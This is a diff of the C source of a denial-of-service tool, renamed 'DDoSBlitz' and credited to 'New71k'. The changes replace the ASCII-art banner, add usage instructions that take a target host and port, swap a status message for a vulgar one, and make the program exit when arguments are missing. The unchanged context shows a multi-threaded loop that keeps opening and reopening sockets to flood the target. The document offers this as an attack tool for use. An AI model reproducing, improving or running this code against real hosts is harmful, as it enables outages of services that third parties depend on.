@@ -15,17 +15,22 @@
 
 void banner() {
     printf("\033[1;31m");
-    printf(" ██████╗ ██████╗  ██████╗ ███████╗██╗     ██╗████████╗███████╗\n");
-    printf("██╔════╝ ██╔══██╗██╔═══██╗██╔════╝██║     ██║╚══██╔══╝██╔════╝\n");
-    printf("██║  ███╗██████╔╝██║   ██║█████╗  ██║     ██║   ██║   █████╗  \n");
-    printf("██║   ██║██╔══██╗██║   ██║██╔══╝  ██║     ██║   ██║   ██╔══╝  \n");
-    printf("╚██████╔╝██║  ██║╚██████╔╝███████╗███████╗██║   ██║   ███████╗\n");
-    printf(" ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝   ╚═╝   ╚══════╝\n");
-    printf("By new71k\n");
+    printf(" @@@@@@@  @@@@@@@   @@@@@@   @@@@@@ @@@@@@@  @@@      @@@ @@@@@@@ @@@@@@@@\n");
+    printf(" @@!  @@@ @@!  @@@ @@!  @@@ !@@     @@!  @@@ @@!      @@!   @@!        @@!\n");
+    printf(" @!@  !@! @!@  !@! @!@  !@!  !@@!!  @!@!@!@  @!!      !!@   @!!      @!!  \n");
+    printf(" !!:  !!! !!:  !!! !!:  !!!     !:! !!:  !!! !!:      !!:   !!:    !!:    \n");
+    printf(" :: :  :  :: :  :   : :. :  ::.: :  :: : ::  : ::.: : :      :    :.::.: :\n");
+    printf("                                                                           \n");
+    printf("                          DDoSBlitz\n");
+    printf("                           By - New71k\n");
     printf("\033[41m\033[1;37m  Distributed Denial of Service - C Tools  \033[0m\n");
     printf("\033[1;33mAuthor   : \033[1;37mNew71k\033[0m\n");
     printf("\033[1;32mPress CTRL+C to stop sending\033[1;37m\n");
     printf("------------\n");
+    printf("\033[1;37mUsage:\033[0m\n");
+    printf("    \033[1;32m./DDoSBlitz <target> <port>\033[0m\n");
+    printf("Example:\n");
+    printf("    \033[1;32m./DDoSBlitz www.example.com 80\033[0m\n");
 }
 
 int make_socket(char *host, char *port) {
@@ -79,7 +84,7 @@ void attack(char *host, char *port, int id) {
                 close(sockets[x]);
                 sockets[x] = make_socket(host, port);
             } else {
-                fprintf(stderr, "[%i: %s DDoS Sent]\n", id, host);
+                fprintf(stderr, "[%i: %s DDoSBlitz Fucking the Server]\n", id, host);
             }
         }
         usleep(300000);
@@ -100,7 +105,8 @@ void cycle_identity() {
 int main(int argc, char **argv) {
     banner();
     if (argc != 3) {
-        cycle_identity();
+        fprintf(stderr, "Usage: ./DDoSBlitz <target> <port>\n");
+        exit(1);
     } else {
         int x;
         for (x = 0; x < THREADS; x++) {
